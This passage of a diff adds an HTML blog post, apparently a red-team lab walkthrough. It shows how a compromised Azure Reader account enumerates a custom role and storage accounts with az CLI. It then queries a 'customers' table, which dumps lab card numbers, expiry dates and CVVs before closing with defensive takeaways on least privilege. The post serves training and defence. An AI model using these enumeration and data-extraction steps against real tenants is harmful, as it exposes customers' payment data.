+</span></span><span class="line"><span class="cl"><span class="n">1ae7323ccead497685d1c18a</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">57d7395f82fe4a2593d003b4</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">57d7395f82fe4a2593d003b4</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">57d7395f82fe4a2593d003b4</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">57d7395f82fe4a2593d003b4</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">9f9dcd98a3a74c7a9b2abace</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">9f9dcd98a3a74c7a9b2abace</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">Clara</span> <span class="n">Miller</span>             <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="n">dbuser</span>                   <span class="n">Reader</span>
+</span></span></code></pre></div><p>According to the above output the user <strong>Josh Harvey</strong> has been assigned the <code>Reader</code> role. The Reader role in Azure grants read-only access to resources but does not allow modification or access to sensitive data like Key Vault contents or databases.</p>
+<p>We also see that <code>CUSTOMER-DATABASE-ACCESS</code> group has been assigned the <code>Customer Database Access</code> role so let enumerate that.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">az</span> <span class="n">role</span> <span class="n">definition</span> <span class="n">list</span> <span class="p">-</span><span class="n">-custom-role-only</span> <span class="n">true</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&#34;[?roleName==&#39;Customer Database Access&#39;]&#34;</span> <span class="n">-o</span> <span class="n">json</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/8cwsJiC.png"></p>
+<blockquote>
+<p>The above output shows that the group gives members the ability to list storage tables and their values! The Azure Storage Tables are a NoSQL data store for large, structured, non-relational data, part of Azure Storage services alongside Blob, File, and Queue Storage.&quot;</p>
+</blockquote>
+<p>We then start by listing the storage accounts in the current Azure subscription in plain text format (TSV) with the below command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">storage</span> <span class="n">account</span> <span class="n">list</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&#34;[].name&#34;</span> <span class="n">-o</span> <span class="n">tsv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">custdatabase</span>
+</span></span><span class="line"><span class="cl"><span class="n">mbtwebsite</span>
+</span></span><span class="line"><span class="cl"><span class="n">securityconfigs</span>
+</span></span></code></pre></div><p>Then we can Issue the following command below to see if any storage tables exist in any of this storage accounts</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">az</span> <span class="n">storage</span> <span class="n">table</span> <span class="n">list</span> <span class="p">-</span><span class="n">-account-name</span> <span class="p">&lt;</span><span class="n">storage_account</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-output</span> <span class="n">table</span> <span class="p">-</span><span class="n">-auth-mode</span> <span class="n">login</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/XW1b2zw.png"></p>
+<p>According to the above output only the <code>custdatabase</code> storage account has a storage table named <code>customers</code> , We can then go ahead and query this storage table leading to the disclosure of sensitive information such as payment data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">storage</span> <span class="n">entity</span> <span class="n">query</span> <span class="p">-</span><span class="n">-table-name</span> <span class="n">customers</span> <span class="p">-</span><span class="n">-account-name</span> <span class="n">custdatabase</span> <span class="p">-</span><span class="n">-output</span> <span class="n">table</span> <span class="p">-</span><span class="n">-auth-mode</span> <span class="n">login</span>
+</span></span><span class="line"><span class="cl"><span class="n">PartitionKey</span>    <span class="n">RowKey</span>    <span class="n">Card_expiry</span>    <span class="n">Card_number</span>       <span class="n">Customer_id</span>                           <span class="n">Customer_name</span>                           <span class="n">Cvv</span>
+</span></span><span class="line"><span class="cl"><span class="p">--------------</span>  <span class="p">--------</span>  <span class="p">-------------</span>  <span class="p">----------------</span>  <span class="p">------------------------------------</span>  <span class="p">--------------------------------------</span>  <span class="p">-----</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">1</span>         <span class="mf">10</span><span class="p">/</span><span class="mf">30</span>          <span class="mf">5425233430109903</span>  <span class="n">07244ad0-c228</span><span class="p">-</span><span class="n">43d8-a48e</span><span class="p">-</span><span class="n">1846796aa6ad</span>  <span class="n">SecureBank</span> <span class="n">Holdings</span>                     <span class="mf">543</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">10</span>        <span class="mf">01</span><span class="p">/</span><span class="mf">30</span>          <span class="mf">4347866885036101</span>  <span class="n">cba21bec</span><span class="p">-</span><span class="mf">7e8d</span><span class="p">-</span><span class="mf">4394</span><span class="n">-a145-ea7f6131a998</span>  <span class="n">InnoVenture</span>                             <span class="mf">781</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">2</span>         <span class="mf">09</span><span class="p">/</span><span class="mf">29</span>          <span class="mf">4012000033330026</span>  <span class="n">66d7a744</span><span class="p">-</span><span class="n">5eb6</span><span class="p">-</span><span class="n">4b1b</span><span class="p">-</span><span class="mf">9e70</span><span class="n">-a36824366534</span>  <span class="n">NeuraHealth</span>                             <span class="mf">452</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">3</span>         <span class="mf">05</span><span class="p">/</span><span class="mf">31</span>          <span class="mf">4657490028942036</span>  <span class="n">6a88c0ff-b79c</span><span class="p">-</span><span class="mf">4842</span><span class="p">-</span><span class="n">92f1-f25d53c5cbe4</span>  <span class="n">DreamScreen</span> <span class="n">Entertainment</span>               <span class="mf">683</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">4</span>         <span class="mf">01</span><span class="p">/</span><span class="mf">29</span>          <span class="mf">4657493919180161</span>  <span class="n">14fb331d-a82e</span><span class="p">-</span><span class="n">41f8</span><span class="p">-</span><span class="n">8f20-d630f312dd3e</span>  <span class="n">InfiNet</span> <span class="n">Solutions</span>                       <span class="mf">855</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">5</span>         <span class="mf">08</span><span class="p">/</span><span class="mf">29</span>          <span class="mf">4657490203402673</span>  <span class="nb">cdf53341-b806</span><span class="p">-</span><span class="n">4f69-a1e2</span><span class="p">-</span><span class="n">7b632b1d405d</span>  <span class="n">Skyward</span> <span class="n">Aerospace</span>                       <span class="mf">344</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">6</span>         <span class="mf">12</span><span class="p">/</span><span class="mf">30</span>          <span class="mf">4594045518310163</span>  <span class="nb">c6e6418b-fc4e</span><span class="p">-</span><span class="n">4f7b-a463</span><span class="p">-</span><span class="n">1a3bc6551cd3</span>  <span class="n">Quasar</span> <span class="n">Analytics</span> <span class="n">Inc</span>                    <span class="mf">145</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">7</span>         <span class="mf">02</span><span class="p">/</span><span class="mf">29</span>          <span class="mf">4594055970518286</span>  <span class="n">fc4f9042</span><span class="p">-</span><span class="n">5b94</span><span class="p">-</span><span class="n">4a79-b18a</span><span class="p">-</span><span class="n">40fa621fe2e1</span>  <span class="n">DataGuard</span> <span class="n">Inc</span>                           <span class="mf">243</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">8</span>         <span class="mf">06</span><span class="p">/</span><span class="mf">30</span>          <span class="mf">4698558990398121</span>  <span class="n">07a2cfae</span><span class="p">-</span><span class="n">16de</span><span class="p">-</span><span class="n">41a9-af51-b9cd9f077800</span>  <span class="n">Huge</span> <span class="n">Logistics</span>                          <span class="mf">546</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">9</span>         <span class="mf">03</span><span class="p">/</span><span class="mf">30</span>          <span class="mf">4698559508013566</span>  <span class="n">512df22d</span><span class="p">-</span><span class="mf">815f</span><span class="p">-</span><span class="n">4f98</span><span class="p">-</span><span class="n">92af-a615a92ea39d</span>  <span class="n">SmartMove</span> <span class="n">Robotics</span>                      <span class="mf">992</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1</span>               <span class="mf">99</span>                                                                               <span class="n">Flag</span><span class="err">:</span> <span class="n">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
+</span></span></code></pre></div><p>Have fun ⋆.˚ ᡣ𐭩 .𖥔˚</p>
+<h2 id="key-takeaways"><strong>Key Takeaways</strong><a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
+<ul>
+<li>
+<p>Azure Key Vault is a critical service for securely storing and managing sensitive information like secrets, keys, and certificates.</p>
+</li>
+<li>
+<p>By centralizing secrets in the Key Vault, you reduce the risk of exposure and ensure tighter control over access.
+Role-based access control (RBAC) and Access Policies help limit access to only authorized users and services.</p>
+</li>
+<li>
+<p>Regular auditing and rotating of secrets enhances security, minimizing potential breaches.</p>
+</li>
+<li>
+<p>Implementing the Principle of Least Privilege ensures that only necessary permissions are granted, reducing attack surfaces.</p>
+</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/azure/">Azure</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/entra-id/">Entra-ID</a></li>
+      <li><a href="http://localhost:1313/tags/powershell/">Powershell</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Loot Exchange, Teams and SharePoint with GraphRunner</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/intro_to_azure_recon_with_bloodhound/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Intro to Azure Recon with BloodHound</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
